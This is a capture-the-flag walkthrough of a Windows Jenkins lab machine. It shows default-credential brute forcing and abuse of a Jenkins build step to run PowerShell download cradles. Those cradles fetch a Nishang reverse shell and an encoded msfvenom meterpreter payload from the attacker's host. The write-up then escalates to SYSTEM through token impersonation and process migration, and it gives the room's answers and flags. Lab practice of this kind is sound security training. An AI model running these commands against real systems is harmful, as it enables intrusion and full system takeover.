[Initial Access] + [Switching Shells]

[*] Target: 10.10.123.218

[Question 1] How many ports are open? (TCP only) => 3

    # nmap -p- -sS -T 5 10.10.123.218 -Pn

        PORT     STATE SERVICE
        80/tcp   open  http
        3389/tcp open  ms-wbt-server
        8080/tcp open  http-proxy

[Question 2] What is the username and password for the login panel? (in the format username:password) => admin:admin

    [Note] Many devices (especially in the Internet of Things) come with default non-random passwords that are often left unchanged.

        POST /j_acegi_security_check HTTP/1.1
        Host: 10.10.123.218:8080
        User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
        Accept-Language: en-US,en;q=0.5
        Accept-Encoding: gzip, deflate
        Content-Type: application/x-www-form-urlencoded
        Content-Length: 55
        Origin: http://10.10.123.218:8080
        Connection: close
        Referer: http://10.10.123.218:8080/loginError
        Cookie: JSESSIONID.3ab872ee=node01in8wwj93rep01xlme0iaj7hh31.node0
        Upgrade-Insecure-Requests: 1

        j_username=§test§&j_password=§test§&from=%2F&Submit=Sign+in

    [Note] I use the /usr/share/seclists/Passwords/Default-Credentials/default-passwords.txt

    [>>] admin:admin is the correct credential

        HTTP/1.1 302 Found
        Connection: close
        Date: Sat, 08 Jul 2023 12:52:11 GMT
        X-Content-Type-Options: nosniff
        Set-Cookie: JSESSIONID.3ab872ee=node0ptk64mvi689n17hf6j1fnx75g2.node0;Path=/;HttpOnly
        Expires: Thu, 01 Jan 1970 00:00:00 GMT
        Location: http://10.10.123.218:8080/
        Server: Jetty(9.4.z-SNAPSHOT)

[Question 3] What is the user.txt flag? => 79007a09481963edf2e1321abd9ae2a0

[Question 4] What is the final size of the exe payload that you generated? => 73802

    [Hint] Check the configure tab under project options

    [?] Jenkins is a tool used by software developers to make their work easier and faster. It helps with building, testing, and delivering software
        With Jenkins, developers can automatically check if their code works properly, and it can even deploy their code to different environments like testing or production

    [+] Go to the http://10.10.123.218:8080/job/project/configure, in the "Buid" part, you can see a "Execute Windows batch command" board

        Command: powershell iex (New-Object Net.WebClient).DownloadString('http://10.14.56.1:4444/test.txt')

        [Note] To execute the command you need to go to http://10.10.123.218:8080/ and click on the "small clock with play button" in the project you want to run

        [>>] python3 -m http.server 4444

                Serving HTTP on 0.0.0.0 port 4444 (http://0.0.0.0:4444/) ...
                10.10.123.218 - - [08/Jul/2023 09:27:36] code 404, message File not found
                10.10.123.218 - - [08/Jul/2023 09:27:36] "GET /test.txt HTTP/1.1" 404 -

    [+] Since this is a Windows application, we'll be using Nishang to gain initial access (nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1), this is some kind of shell-netcat

        Command: powershell iex (New-Object Net.WebClient).DownloadString('http://10.14.56.1:4444/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.14.56.1 -Port 1234
    
        [>>] $ nc -lnvp 1234

            listening on [any] 1234 ...
            connect to [10.14.56.1] from (UNKNOWN) [10.10.123.218] 49326
            Windows PowerShell running as user bruce on ALFRED
            Copyright (C) 2015 Microsoft Corporation. All rights reserved.

            ...
            PS C:\Users\bruce\Desktop> ls


                Directory: C:\Users\bruce\Desktop


            Mode                LastWriteTime     Length Name                              
            ----                -------------     ------ ----                              
            -a---        10/25/2019  11:22 PM         32 user.txt                          


            PS C:\Users\bruce\Desktop> type user.txt
            79007a09481963edf2e1321abd9ae2a0

        [+] Create our payload: msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=10.14.56.1 LPORT=5555 -f exe -o shell.exe     
        
                                [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
                                Found 1 compatible encoders
                                Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
                                x86/shikata_ga_nai succeeded with size 381 (iteration=0)
                                x86/shikata_ga_nai chosen with final size 381
                                Payload size: 381 bytes
                                Final size of exe file: 73802 bytes
                                Saved as: shell.exe

            ...
            PS C:\Users\bruce\AppData\Local\Temp> powershell "(New-Object System.Net.WebClient).Downloadfile('http://10.14.56.1:4444/shell.exe','shell.exe')"

            PS C:\Users\bruce\AppData\Local\Temp> .\shell.exe

        [>>] msf6 exploit(multi/handler) > run

            [*] Started reverse TCP handler on 10.14.56.1:5555 
            [*] Sending stage (175686 bytes) to 10.10.123.218
            [*] Meterpreter session 1 opened (10.14.56.1:5555 -> 10.10.123.218:49344) at 2023-07-08 09:59:06 -0400

            meterpreter >


************************************************************************************************************************************************************************************************************************************************************


[Privilege Escalation]

[*] Target: 10.10.123.218

[Question 1] Use the impersonate_token "BUILTIN\Administrators" command to impersonate the Administrators' token. What is the output when you run the getuid command? => NT AUTHORITY\SYSTEM

[Question 2] Read the root.txt file located at C:\Windows\System32\config => dff0f748678f280250f25a45b8046b4a

    [+] Now that we have initial access, let's use token impersonation to gain system access.

    [+] Windows uses tokens to ensure that accounts have the right privileges to carry out particular actions.
        Account tokens are assigned to an account when users log in or are authenticated
        This is usually done by LSASS.exe(think of this as an authentication process).

    [+] This access token consists of: User SIDs(security identifier); Group SIDs; Privileges

    [+] There are two types of access tokens:

        [1] Primary access tokens: those associated with a user account that are generated on log on

        [2] Impersonation tokens: these allow a particular process(or thread in a process) to gain access to resources using the token of another (user/client) process

    [+] For an impersonation token, there are different levels:

        [1] SecurityAnonymous: current user/client cannot impersonate another user/client

        [2] SecurityIdentification: current user/client can get the identity and privileges of a client but cannot impersonate the client

        [3] SecurityImpersonation: current user/client can impersonate the client's security context on the local system

        [4] SecurityDelegation: current user/client can impersonate the client's security context on a remote system

    [+] The privileges of an account(which are either given to the account when created or inherited from a group) allow a user to carry out particular actions.

        [1] SeImpersonatePrivilege: Allows a process to impersonate another user or security context, which can be useful for performing actions on behalf of another user or accessing resources with their privileges.

            [Note] The "Se" prefix in the privilege names stands for "Security."

        [2] SeDebugPrivilege: Allows a process to debug other processes on the system, which is typically required by debugging tools or certain types of software development.

        [3] SeCreateTokenPrivilege: Allows a process to create a primary token, which is required for creating a new user or process security context.

        ....

    PS > whoami /priv                                                                                                                          
                                                                                                                                            
        PRIVILEGES INFORMATION                                                                                                                     
        ----------------------                                                                                                                     
                                                                                                                                                
        Privilege Name                  Description                               State                                                            
        =============================== ========================================= ========                                                         
        ...
        SeDebugPrivilege                Debug programs                            Enabled
        ...
        SeChangeNotifyPrivilege         Bypass traverse checking                  Enabled
        ...
        SeImpersonatePrivilege          Impersonate a client after authentication Enabled
        SeCreateGlobalPrivilege         Create global objects                     Enabled
        ...
    
    meterpreter > load incognito

        Loading extension incognito...Success.

    meterpreter > list_tokens -g
        
        [-] Warning: Not currently running as SYSTEM, not all tokens will be available
                    Call rev2self if primary process token is SYSTEM

            Delegation Tokens Available
            ========================================
            \
            BUILTIN\Administrators
            BUILTIN\Users
            ...

            Impersonation Tokens Available
            ========================================
            No tokens available

    meterpreter > impersonate_token "BUILTIN\Administrators" 

        [-] Warning: Not currently running as SYSTEM, not all tokens will be available
                    Call rev2self if primary process token is SYSTEM
        [+] Delegation token available
        [+] Successfully impersonated user NT AUTHORITY\SYSTEM


    [Fun Fact] In Windows, having a higher privileged token doesn't automatically grant you all the permissions of a privileged user

               [>>] This is because Windows determines the permissions based on the primary token of a process, not the impersonated token.

               [>>] To ensure that you have the correct permissions, you need to migrate to a process with the appropriate permissions. The safest process to choose is the services.exe process.

    meterpreter > ps

        Process List
        ============

        PID   PPID  Name                  Arch  Session  User                          Path
        ---   ----  ----                  ----  -------  ----                          ----
        0     0     [System Process]
        4     0     System                x64   0
        396   4     smss.exe              x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\smss.exe
        ...
        676   580   lsass.exe             x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\lsass.exe
        ...
        2852  864   shell.exe             x86   0        alfred\bruce                  C:\Users\bruce\Desktop\shell.exe
        2916  668   SearchIndexer.exe     x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\SearchIndexer.exe
        2936  524   conhost.exe           x64   0        alfred\bruce                  C:\Windows\System32\conhost.exe

    meterpreter > migrate 676

        [*] Migrating from 2852 to 676...
        [*] Migration completed successfully.

    meterpreter > cat C:\\Windows\\System32\\config\\root.txt
    
        ��dff0f748678f280250f25a45b8046b4a
